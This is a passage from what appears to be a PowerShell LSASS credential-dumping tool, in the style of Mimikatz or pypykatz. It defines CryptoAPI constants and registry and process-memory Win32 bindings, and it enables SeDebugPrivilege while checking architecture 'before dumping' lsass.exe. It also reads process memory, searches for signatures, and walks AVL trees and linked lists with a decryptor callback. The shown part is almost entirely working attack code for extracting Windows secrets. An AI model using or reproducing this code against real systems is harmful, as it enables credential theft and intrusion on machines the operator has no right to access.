	$Global:ALGORITHMS["CALG_SSL3_SHAMD5"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SSL3SHAMD5)
	$Global:ALGORITHMS["CALG_SSL3_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SSL3_MASTER)
	$Global:ALGORITHMS["CALG_SCHANNEL_MASTER_HASH"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SCHANNEL_MASTER_HASH)
	$Global:ALGORITHMS["CALG_SCHANNEL_MAC_KEY"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SCHANNEL_MAC_KEY)
	$Global:ALGORITHMS["CALG_SCHANNEL_ENC_KEY"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SCHANNEL_ENC_KEY)
	$Global:ALGORITHMS["CALG_PCT1_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_PCT1_MASTER)
	$Global:ALGORITHMS["CALG_SSL2_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_SSL2_MASTER)
	$Global:ALGORITHMS["CALG_TLS1_MASTER"] = ($Global:ALG_CLASS_MSG_ENCRYPT -bor $Global:ALG_TYPE_SECURECHANNEL -bor $Global:ALG_SID_TLS1_MASTER)
	$Global:ALGORITHMS["CALG_RC5"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_RC5)
	$Global:ALGORITHMS["CALG_HMAC"] = [Uint64]($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_HMAC)
	$Global:ALGORITHMS["CALG_TLS1PRF"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_TLS1PRF)
	$Global:ALGORITHMS["CALG_HASH_REPLACE_OWF"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_HASH_REPLACE_OWF)
	$Global:ALGORITHMS["CALG_AES_128"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES_128)
	$Global:ALGORITHMS["CALG_AES_192"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES_192)
	$Global:ALGORITHMS["CALG_AES_256"] = [Uint64]($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES_256)
	$Global:ALGORITHMS["CALG_AES"] = ($Global:ALG_CLASS_DATA_ENCRYPT -bor $Global:ALG_TYPE_BLOCK -bor $Global:ALG_SID_AES)
	$Global:ALGORITHMS["CALG_SHA_256"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA_256)
	$Global:ALGORITHMS["CALG_SHA_384"] = ($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA_384)
	$Global:ALGORITHMS["CALG_SHA_512"] = [Uint64]($Global:ALG_CLASS_HASH -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_SHA_512)
	$Global:ALGORITHMS["CALG_ECDH"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_DH -bor $Global:ALG_SID_ECDH)
	$Global:ALGORITHMS["CALG_ECMQV"] = ($Global:ALG_CLASS_KEY_EXCHANGE -bor $Global:ALG_TYPE_ANY -bor $Global:ALG_SID_ECMQV)
	$Global:ALGORITHMS["CALG_ECDSA"] = ($Global:ALG_CLASS_SIGNATURE -bor $Global:ALG_TYPE_DSS -bor $Global:ALG_SID_ECDSA)

	$Global:SYMMETRIC_MODE_CBC = 1
	$Global:SYMMETRIC_MODE_ECB = 0

	$Global:ALGORITHMS_DATA = @{}
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_SHA"]] = ([Math]::Floor(160/8), "SHA1", $Global:Null, $Global:Null, [Math]::Floor(512/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_HMAC"]] = ([Math]::Floor(160/8), "SHA512", $Global:Null, $Global:Null, [Math]::Floor(512/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_3DES"]] = ([Math]::Floor(192/8), "DES3", $Global:SYMMETRIC_MODE_CBC, [Math]::Floor(64/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_SHA_512"]] = ([Math]::Floor(128/8), "SHA512", $Global:Null, $Global:Null, [Math]::Floor(1024/8))
	$Global:ALGORITHMS_DATA[$Global:ALGORITHMS["CALG_AES_256"]] = ([Math]::Floor(256/8), "AES", $Global:SYMMETRIC_MODE_CBC, [Math]::Floor(128/8))

	$Global:FLAGS = @{}
	$Global:FLAGS["CRYPTPROTECT_UI_FORBIDDEN"] = 0x1
	$Global:FLAGS["CRYPTPROTECT_LOCAL_MACHINE"] = 0x4
	$Global:FLAGS["CRYPTPROTECT_CRED_SYNC"] = 0x8
	$Global:FLAGS["CRYPTPROTECT_AUDIT"] = 0x10
	$Global:FLAGS["CRYPTPROTECT_VERIFY_PROTECTION"] = 0x40
	$Global:FLAGS["CRYPTPROTECT_CRED_REGENERATE"] = 0x80
	$Global:FLAGS["CRYPTPROTECT_SYSTEM"] = 0x20000000
}

<### Registry Windows API functions ###>

function LoadRegAPI
{
	# RegOpenKeyEx()/RegQueryInfoKey()/RegQueryValueEx()/RegCloseKey()
	If (-not ([System.Management.Automation.PSTypeName]'WinRegAPI').Type)
	{
		Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;

		public class WinRegAPI
		{
			[DllImport("advapi32.dll")]
			public static extern int RegOpenKeyEx(int hKey, string lpSubKey, int ulOptions, int samDesired, ref int phkResult);
			[DllImport("advapi32.dll")]
			public static extern int RegQueryInfoKey(int hkey, StringBuilder lpClass, ref int lpcchClass, int lpReserved, ref int lpcSubKeys, ref int lpcbMaxSubKeyLen, ref int lpcbMaxClassLen, ref int lpcValues, ref int lpcbMaxValueNameLen, ref int lpcbMaxValueLen, ref int lpcbSecurityDescriptor, ref int lpftLastWriteTime);
			[DllImport("advapi32.dll")]
			public static extern int RegQueryValueEx(int hKey, string lpValueName, int lpReserved, ref int lpType, byte[] lpData, ref int lpcbData);
			[DllImport("advapi32.dll")]
			public static extern int RegCloseKey(int hKey);
		}
'@
	}
}

function Get-RegKeyClass($Key, $SubKey)
{
	# Load C# Registry Key functions
	LoadRegApi

	Switch ($Key) {
		"HKCR" { $nKey = 0x80000000} # HK Classes Root
		"HKCU" { $nKey = 0x80000001} # HK Current User
		"HKLM" { $nKey = 0x80000002} # HK Local Machine
		"HKU"  { $nKey = 0x80000003} # HK Users
		"HKCC" { $nKey = 0x80000005} # HK Current Config
		default {
			Write-Error "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
			return $Null
		}
	}

	$hKey = [IntPtr]::Zero
	$Result = [WinRegAPI]::RegOpenKeyEx($nKey, $SubKey, 0, 0x19, [ref]$hKey)
	If ($Result -eq 0)
	{
		$ClassVal = New-Object Text.StringBuilder 1024
		$Len = [Int]1024
		$Result = [WinRegAPI]::RegQueryInfoKey($hKey, $ClassVal, [ref]$Len, 0, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null, [ref]$Null)
		If ($Result -eq 0)
		{
			[WinRegAPI]::RegCloseKey($hKey) | Out-Null
			return $ClassVal.ToString()
		}
		Else
		{
			Write-Error "RegQueryInfoKey() failed"
			return $Null
		}
	}
	Else
	{
		Write-Error "RegOpenKeyEx() failed"
		return $Null
	}
}

function Get-RegKeyPropertyValue($Key, $SubKey, $Property)
{

	# Load C# Registry Key functions
	LoadRegApi

	Switch ($Key) {
		"HKCR" { $nKey = 0x80000000} #HK Classes Root
		"HKCU" { $nKey = 0x80000001} #HK Current User
		"HKLM" { $nKey = 0x80000002} #HK Local Machine
		"HKU"  { $nKey = 0x80000003} #HK Users
		"HKCC" { $nKey = 0x80000005} #HK Current Config
		default {
			throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
		}
	}

	$hKey = [IntPtr]::Zero
	$Result = [WinRegAPI]::RegOpenKeyEx($nKey, $SubKey, 0, 0x19, [ref]$hKey)
	If ($Result -eq 0)
	{
		$ValueLen = [Int]0
		$Result = [WinRegAPI]::RegQueryValueEx($hKey, $Property, 0, [ref]$Null, $Null, [ref]$ValueLen)
		If ($Result -eq 0)
		{
			$Value = New-Object byte[] $ValueLen
			$Result = [WinRegAPI]::RegQueryValueEx($hKey, $Property, 0, [ref]$Null, $Value, [ref]$ValueLen)
			If ($Result -eq 0)
			{
				[WinRegAPI]::RegCloseKey($hKey) | Out-Null
				return $Value
			}
			Else
			{
				Write-Error "RegQueryValueEx() failed to retrieve value"
				return $Null
			}
		}
		Else
		{
			Write-Error "RegQueryValueEx() failed to compute value length"
			return $Null
		}
	}
	Else
	{
		Write-Error "RegOpenKeyEx() failed"
		return $Null
	}
}

<### LSASS functions ###>

<#
	GetNativeSystemInfo() Windows API function
	Also implement custom GetSystemInfo()
#>
function GetSystemInfo()
{
	If (-not ([System.Management.Automation.PSTypeName]'WinSystemInfo').Type)
	{
		Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;

		public class WinSystemInfo
		{
			[StructLayout(LayoutKind.Explicit)]
			public struct _PROCESSOR_INFO_UNION
			{
				[FieldOffset(0)]
				public UInt32 dwOemId;
				[FieldOffset(0)]
				public UInt16 wProcessorArchitecture;
				[FieldOffset(2)]
				public UInt16 wReserved;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct SYSTEM_INFO
			{
				public _PROCESSOR_INFO_UNION uProcessorInfo;
				public UInt32 dwPageSize;
				public IntPtr lpMinimumApplicationAddress;
				public IntPtr lpMaximumApplicationAddress;
				public IntPtr dwActiveProcessorMask;
				public UInt32 dwNumberOfProcessors;
				public UInt32 dwProcessorType;
				public UInt32 dwAllocationGranularity;
				public UInt16 wProcessorLevel;
				public UInt16 wProcessorRevision;
			}

			[DllImport("kernel32.dll")]
			public static extern void GetNativeSystemInfo([MarshalAs(UnmanagedType.Struct)] ref SYSTEM_INFO lpSystemInfo);

			public static SYSTEM_INFO GetSystemInfo()
			{
				SYSTEM_INFO systemInfo = new SYSTEM_INFO();
				GetNativeSystemInfo(ref systemInfo);
				return systemInfo;
			}
		}
'@
	}

	return [WinSystemInfo]::GetSystemInfo()
}

function EnablePrivilege($Privilege)
{
	# Enable desired privilege. Require admin rights
	# Add Win API functions: AdjustTokenPrivileges()/OpenProcessToken()/LookupPrivilegeValue()
	# A New function is define to set privilege on process: SetPrivilege()
	If (-not ([System.Management.Automation.PSTypeName]'WinPriv').Type)
	{
		Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;

		public class WinPriv
		{
			[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
			internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
				ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

			[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
			internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

			[DllImport("advapi32.dll", SetLastError = true)]
			internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

			[StructLayout(LayoutKind.Sequential, Pack = 1)]
			internal struct TokPriv1Luid
			{
				public int Count;
				public long Luid;
				public int Attr;
			}

			internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
			internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
			internal const int TOKEN_QUERY = 0x00000008;
			internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

			public static bool SetPrivilege(IntPtr ProcHandle, string Privilege, bool Disable)
			{
				bool retVal;
				IntPtr TokenHandle = IntPtr.Zero;
				retVal = OpenProcessToken(ProcHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref TokenHandle);

				TokPriv1Luid tp;
				tp.Count = 1;
				tp.Luid = 0;
				if (Disable)
				{
					tp.Attr = SE_PRIVILEGE_DISABLED;
				}
				else
				{
					tp.Attr = SE_PRIVILEGE_ENABLED;
				}

				retVal = LookupPrivilegeValue(null, Privilege, ref tp.Luid);
				if (!retVal)
				{
					return retVal;
				}
				retVal = AdjustTokenPrivileges(TokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
				return retVal;
			}
		}
'@
	}

	$ProcHandle = (Get-Process -id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
	$PrivilegeEnabled = [WinPriv]::SetPrivilege($ProcHandle, $Privilege, $False)
	If (-not $PrivilegeEnabled)
	{
		return $False
	}

	return $True
}

<#
	Verify that process architecture matching this process architecture
	And SeDebugPrivilege enabled
#>
function SetupBeforeDumping()
{
	# Check if It's a 32/64 bit process while accessing a 64/32 bit lsass.exe
	# Win API will complain if different
	If ([IntPtr]::Size -eq 4 -and ((Get-WmiObject Win32_OperatingSystem | select OSArchitecture).OSArchitecture -Like "64*"))
	{
		Write-Host ("[-] Running 32-bit Powershell to access 64-bit lsass.exe will fail")
		return $False
	}
	ElseIf ([IntPtr]::Size -eq 8 -and ((Get-WmiObject Win32_OperatingSystem | select OSArchitecture).OSArchitecture -Like "32*"))
	{
		Write-Host ("[-] Running 64-bit Powershell to access 32-bit lsass.exe will fail")
		return $False
	}

	return (EnablePrivilege "SeDebugPrivilege")
}

<#
	Many WIndows API functions to play with processes
#>
function LoadWinProcAPI
{
	# OpenProcess()/VirtualQueryEx()/CloseHandle()/EnumProcessModules()/GetModuleFileNameEx()/GetModuleInformation()
	# DuplicateHandle()/GetCurrentProcess()/GetProcessImageFileName()/NtQuerySystemInformation()/NtQueryObject()
	If (-not ([System.Management.Automation.PSTypeName]'WinProcAPI').Type)
	{
		Add-Type -TypeDefinition @'
		using System;
		using System.Text;
		using System.Runtime.InteropServices;

		public class WinProcAPI
		{
			[Flags]
			public enum ProcessAccessFlags : uint
			{
				PROCESS_VM_READ = 0x00000010,
				PROCESS_QUERY_INFORMATION = 0x00000400,
				PROCESS_DUP_HANDLE = 0x0040,
				ALL = 0x001F0FFF
			}

			[Flags]
			public enum AllocationProtectEnum : uint
			{
				PAGE_EXECUTE = 0x00000010,
				PAGE_EXECUTE_READ = 0x00000020,
				PAGE_EXECUTE_READWRITE = 0x00000040,
				PAGE_EXECUTE_WRITECOPY = 0x00000080,
				PAGE_NOACCESS = 0x00000001,
				PAGE_READONLY = 0x00000002,
				PAGE_READWRITE = 0x00000004,
				PAGE_WRITECOPY = 0x00000008,
				PAGE_GUARD = 0x00000100,
				PAGE_NOCACHE = 0x00000200,
				PAGE_WRITECOMBINE = 0x00000400
			}

			[Flags]
			public enum StateEnum : uint
			{
				MEM_COMMIT = 0x00001000,
				MEM_FREE = 0x00010000,
				MEM_RESERVE = 0x00002000
			}

			[Flags]
			public enum TypeEnum : uint
			{
				MEM_IMAGE = 0x01000000,
				MEM_MAPPED = 0x00040000,
				MEM_PRIVATE = 0x00020000
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct MEMORY_BASIC_INFORMATION
			{
				public IntPtr BaseAddress;
				public IntPtr AllocationBase;
				public AllocationProtectEnum AllocationProtect;
				public IntPtr RegionSize;
				public StateEnum State;
				public AllocationProtectEnum Protect;
				public TypeEnum Type;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct MODULEINFO
			{
				public IntPtr lpBaseOfDll;
				public uint SizeOfImage;
				public IntPtr EntryPoint;
			}

			[Flags]
			public enum SYSTEM_INFORMATION_CLASS : uint
			{
				SystemHandleInformation = 0x10
			}

			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			public struct SYSTEM_HANDLE_INFORMATION
			{
				public uint ProcessId;
				public byte ObjectTypeNumber;
				public byte Flags;
				public ushort Handle;
				public IntPtr pObject;
				public int GrantedAccess;
			}

			[Flags]
			public enum OBJECT_INFORMATION_CLASS : uint
			{
				ObjectTypeInformation = 0x2
			}

			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			public struct UNICODE_STRING
			{
				public ushort Length;
				public ushort MaximumLength;
				[MarshalAs(UnmanagedType.LPWStr)] public string Buffer;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct GENERIC_MAPPING
			{
				public int GenericRead;
				public int GenericWrite;
				public int GenericExecute;
				public int GenericAll;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct OBJECT_TYPE_INFORMATION
			{
				public UNICODE_STRING TypeName;
				public int TotalNumberOfObjects;
				public int TotalNumberOfHandles;
				public int TotalPagedPoolUsage;
				public int TotalNonPagedPoolUsage;
				public int TotalNamePoolUsage;
				public int TotalHandleTableUsage;
				public int HighWaterNumberOfObjects;
				public int HighWaterNumberOfHandles;
				public int HighWaterPagedPoolUsage;
				public int HighWaterNonPagedPoolUsage;
				public int HighWaterNamePoolUsage;
				public int HighWaterHandleTableUsage;
				public int InvalidAttributes;
				public GENERIC_MAPPING GenericMapping;
				public int ValidAccessMask;
				public byte SecurityRequired;
				public byte MaintainHandleCount;
				public int PoolType;
				public int DefaultPagedPoolCharge;
				public int DefaultNonPagedPoolCharge;
			}

			public const uint STATUS_SUCCESS = 0x0;
			public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

			[DllImport("kernel32.dll")]
			public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
			[DllImport("kernel32.dll")]
			public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, ref MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
			[DllImport("kernel32.dll")]
			public static extern bool CloseHandle(IntPtr hObject);
			[DllImport("Kernel32.dll", SetLastError = true)]
			public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwOptions);
			[DllImport("Kernel32.dll", SetLastError = true)]
			public static extern IntPtr GetCurrentProcess();
			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref uint lpNumberOfBytesRead);

			[DllImport("ntdll.dll")]
			public static extern uint NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength);
			[DllImport("ntdll.dll")]
			public static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref uint ReturnLength);

			[DllImport("psapi.dll", SetLastError = true)]
			public static extern bool EnumProcessModules(IntPtr hProcess, IntPtr[] lphModule, uint cb, ref uint lpcbNeeded);
			[DllImport("psapi.dll")]
			public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, StringBuilder lpBaseName, uint nSize);
			[DllImport("psapi.dll", SetLastError=true)]
			public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, ref MODULEINFO lpmodinfo, uint cb);
			[DllImport("psapi.dll")]
			public static extern uint GetProcessImageFileName(IntPtr hProcess, StringBuilder lpImageFileName, int nSize);
		}
'@
	}
}

<#
	Find indexes of "search" into "bytes"
#>
function Find-Bytes($Bytes, $Search, $Start, $All)
{
	$Res = @()
    For ($Index = $Start; $Index -le $Bytes.Length - $Search.Length ; $Index++)
	{
        For ($i = 0; $i -lt $Search.Length -and $Bytes[$Index + $i] -eq $Search[$i]; $i++) {}
        If ($i -ge $Search.Length)
		{
            $Res += $Index
            If (!$All) { return $Res }
        }
    }

	return $Res
}

<#
	Iterate over process pages to find offset address
	Return all bytes in page and offset in page to address
#>
$Global:CachedMemory = @{}
$Global:CachedMemory["Buff"] = @()
$Global:CachedMemory["BaseAddr"] = 0
$Global:CachedMemory["EndAddr"] = 0
function ReadMemory($Handle, $Pages, $Addr)
{
	If (($Addr -ge $Global:CachedMemory["BaseAddr"]) -and ($Addr -lt $Global:CachedMemory["EndAddr"]))
	{
		# Address is inside already cached memory page range -> Return cached buffer

		return ($Global:CachedMemory["Buff"], ($Addr - $Global:CachedMemory["BaseAddr"]), $Global:CachedMemory["BaseAddr"])
	}
	Else
	{
		ForEach ($Page in $Pages)
		{
			If (($Addr -ge $Page["BaseAddress"]) -and ($Addr -lt $Page["EndAddress"]))
			{
				$BuffLen = $Page["RegionSize"] + 100
				$Buff = New-Object byte[] $BuffLen
				$BytesRead = $Null
				$Res = [WinProcAPI]::ReadProcessMemory($Handle, $Page["BaseAddress"], $Buff, $Page["RegionSize"], [ref] $BytesRead)
				If (-not $Res)
				{
					Write-Host ("[-] Failed to read page. Try again")
					return (ReadMemory $Handle $Pages $Addr)
				}
				ElseIf ($BytesRead -ne $Page["RegionSize"])
				{
					Write-Host ("[-] Failed to read entire page region size")
					return $Null
				}
				Else
				{
					# Save memory page and return
					$Global:CachedMemory["Buff"] = $Buff
					$Global:CachedMemory["BaseAddr"] = $Page["BaseAddress"]
					$Global:CachedMemory["EndAddr"] = $Page["EndAddress"]

					return ($Buff, ($Addr - $Page["BaseAddress"]), $Page["BaseAddress"])
				}
			}
		}
	}

	Write-Host ("[-] Address 0x{0:X8} not found in process pages" -f ($Addr))
	return $Null
}

<#
	Retrieve indexes into buff where signature found at address
	Return the buffer and indexes
#>
function SearchMemory($Handle, $Pages, $Address, $Signature)
{
	$Buff, $OffBuff, $BaseAddress = ReadMemory $Handle $Pages $Address
	If ($Buff)
	{
		$SigIndexes = Find-Bytes $Buff $Signature 0 $True
		If ($SigIndexes)
		{
			return ($Buff, $SigIndexes)
		}
		Else
		{
			return $Null
		}
	}
	Else
	{
		return $Null
	}
}

<#
	Architecture alignment
	Return a 8-byte/4-byte align offset
#>
function AlignAddress($BaseAddr, $OffBuf, $Alignment)
{
	If (-not $Alignment) { $Alignment = [System.IntPtr]::Size }
	$Diff = ($BaseAddr + $OffBuf) % $Alignment

	return ($OffBuf + $Diff)
}

<#
	Return the desired type into the buffer starting at offset
	The type can be a structure and It will be set inside Struct parameter
#>
function GetType($Buff, $BaseAddr, [ref]$Offset, $Type, $Struct)
{
	Switch ($Type)
	{
		"Pointer"
		{
			If ([System.IntPtr]::Size -eq 8)
			{
				return ([System.BitConverter]::ToUInt64((ReadBuff $Buff ([System.IntPtr]::Size) $Offset), 0))
			}
			Else
			{
				return ([System.BitConverter]::ToUInt32((ReadBuff $Buff ([System.IntPtr]::Size) $Offset), 0))
			}
		}
		"PVoid"
		{
			return (GetType $Buff $BaseAddr $Offset "Pointer")
		}
		"Bool"
		{
			return (GetType $Buff $BaseAddr $Offset "Pointer")
		}
		"Boolean"
		{
			return ([UInt32](ReadBuff $Buff 1 $Offset))
		}
		"Byte"
		{
			return (ReadBuff $Buff 1 $Offset)
		}
		"UShort"
		{
			return ([System.BitConverter]::ToUint16((ReadBuff $Buff 2 $Offset), 0))
		}
		"Short"
		{
			return ([System.BitConverter]::ToInt16((ReadBuff $Buff 2 $Offset), 0))
		}
		"Word"
		{
			return (GetType $Buff $BaseAddr $Offset "UShort")
		}
		"DWord"
		{
			return ([System.BitConverter]::ToUInt32((ReadBuff $Buff 4 $Offset), 0))
		}
		"Handle"
		{
			return (GetType $Buff $BaseAddr $Offset "Pointer")
		}
		"ULong"
		{
			return (GetType $Buff $BaseAddr $Offset "Dword")
		}
		"ULong64"
		{
			return ([System.BitConverter]::ToUInt64((ReadBuff $Buff 8 $Offset), 0))
		}
		"List_Entry"
		{
			$Struct["Flink"] = GetType $Buff $BaseAddr $Offset "Pointer"
			$Struct["Blink"] = GetType $Buff $BaseAddr $Offset "Pointer"

			return
		}
		"FileTime"
		{
			$Struct["dwLowDateTime"] = GetType $Buff $BaseAddr $Offset "DWord"
			$Struct["dwHighDateTime"] = GetType $Buff $BaseAddr $Offset "DWord"
			$Struct["Value"] = (Shift $Struct["dwHighDateTime"] 32) + $Struct["dwLowDateTime"]

			return
		}
		"PWSTR"
		{
			return (GetType $Buff $BaseAddr $Offset "Pointer")
		}
		"PSID"
		{
			return (GetType $Buff $BaseAddr $Offset "Pointer")
		}
		"LUID"
		{
			$Struct["LowPart"] = GetType $Buff $BaseAddr $Offset "DWord"
			$Struct["HighPart"] = GetType $Buff $BaseAddr $Offset "DWord"
			$Struct["Value"] = (Shift $Struct["HighPart"] 32) + $Struct["LowPart"]

			return
		}
		"LSA_Unicode_String"
		{
			$Struct["Length"] = GetType $Buff $BaseAddr $Offset "UShort"
			$Struct["MaximumLength"] = GetType $Buff $BaseAddr $Offset "UShort"
			$Offset.Value = AlignAddress $BaseAddr ($Offset.Value)
			$Struct["Buffer"] = GetType $Buff $BaseAddr $Offset "Pointer"

			return
		}
		"ANSI_String"
		{
			$Struct["Length"] = GetType $Buff $BaseAddr $Offset "UShort"
			$Struct["MaximumLength"] = GetType $Buff $BaseAddr $Offset "UShort"
			$Offset.Value = AlignAddress $BaseAddr ($Offset.Value)
			$Struct["Buffer"] = GetType $Buff $BaseAddr $Offset "Pointer"

			return
		}
	}
}

<#
	Get absolute pointer value = relative pointer into buff + addr (+ 4 if 64 bit)
#>
function GetPtr-WithOffset($Handle, $Pages, $Addr, $ProcArch)
{
	$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Addr

	If ($Buff)
	{
		If ($ProcArch -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
		{
			return ([System.BitConverter]::ToUInt32($Buff[$OffAddr..($OffAddr + 3)], 0) + $Addr + 4)
		}
		Else
		{
			return ([System.BitConverter]::ToUInt32($Buff[$OffAddr..($OffAddr + 3)], 0) + $Addr)
		}
	}
	Else
	{
		return $Null
	}
}

<#
	Get absolute pointer value into buff
#>
function GetPtr($Handle, $Pages, $Addr, $ProcArch)
{
	$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Addr

	If ($Buff)
	{
		If ($ProcArch -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
		{
			return ([System.BitConverter]::ToUInt64($Buff[$OffAddr..($OffAddr + 7)], 0))
		}
		Else
		{
			return ([System.BitConverter]::ToUInt32($Buff[$OffAddr..($OffAddr + 3)], 0))
		}
	}
	Else
	{
		return $Null
	}
}

<#
	Read nbbytes into buff at offset and update offset passed as reference
#>
function ReadBuff($Buff, $NbBytes, [ref]$Offset)
{
	$OldOffset = $Offset.Value
	$Offset.Value = $Offset.Value + $NbBytes

	return ($Buff[$OldOffset..($OldOffset + $NbBytes - 1)])
}

<#
	Walk on the AVL tree
	Extract all OrderedPointer values and store them into Result_Ptr_List
	NodePtr = Pointer to RTL_AVL_TABLE struct
#>
function Walk-AVL($Handle, $Pages, $NodePtr, [ref]$Result_Ptr_List)
{
	If ($NodePtr -eq 0) { return }

	$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $NodePtr
	$BaseAddr += $OffAddr
	$Buff = $Buff[$OffAddr..($Buff.Length-1)]
	$RTL_AVL_TABLE = @{}
	RTL_AVL_TABLE $Buff $RTL_AVL_TABLE $BaseAddr

	If ($RTL_AVL_TABLE["OrderedPointer"] -ne 0)
	{
		$Result_Ptr_List.Value += ,($RTL_AVL_TABLE["OrderedPointer"])
		If ($RTL_AVL_TABLE["BalancedRoot"]["LeftChild"] -ne 0)
		{
			Walk-AVL $Handle $Pages $RTL_AVL_TABLE["BalancedRoot"]["LeftChild"] $Result_Ptr_List
		}

		If ($RTL_AVL_TABLE["BalancedRoot"]["RightChild"] -ne 0)
		{
			Walk-AVL $Handle $Pages $RTL_AVL_TABLE["BalancedRoot"]["RightChild"] $Result_Ptr_List
		}
	}
}

<#
	Walk on the list
	Callback functions use same signature : $MSVDecryptor, $Handle, $Pages, $Entry, $EntryAddr
	Structure functions use 2 signatures :
		- $Buff, $StructToWrite, $BaseAddr
		- $Handle, $Pages, $AddrStruct, $StructToWrite
#>
function Walk-List($Decryptor, $Handle, $Pages, $Pointer, $PointerLoc, $CallbackFunc, $StructFunc, $StructSig)
{
	If ($Pointer -eq 0) { return }

	$Max_Walk = 255

	$Entries_Seen = @{}
	$Entries_Seen[$PointerLoc] = 1

	$NextAddr = $Pointer
	While ($True)
	{
		$NewEntry = @{}
		If ($StructSig -eq 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $NextAddr
			$BaseAddr += $OffAddr
			$Buff = $Buff[$OffAddr..($Buff.Length-1)]
			$StructFunc.Invoke($Buff, $NewEntry, $BaseAddr)
		}
		Else
		{
			$StructFunc.Invoke($Handle, $Pages, $NextAddr, $NewEntry)
		}
		$CallbackFunc.Invoke($Decryptor, $Handle, $Pages, $NewEntry, $NextAddr)

		$Max_Walk -= 1
		If (($NewEntry["Flink"] -ne 0) -and (-not ($Entries_Seen.Keys -Contains $NewEntry["Flink"])) -and ($Max_Walk -ne 0))
		{
			$NextAddr = $NewEntry["Flink"]
			$Entries_Seen[$NextAddr] = 1
		}
		Else
		{
			Break
		}
	}
}

<### Tokens functions ###>

function LoadTokensAPI
{
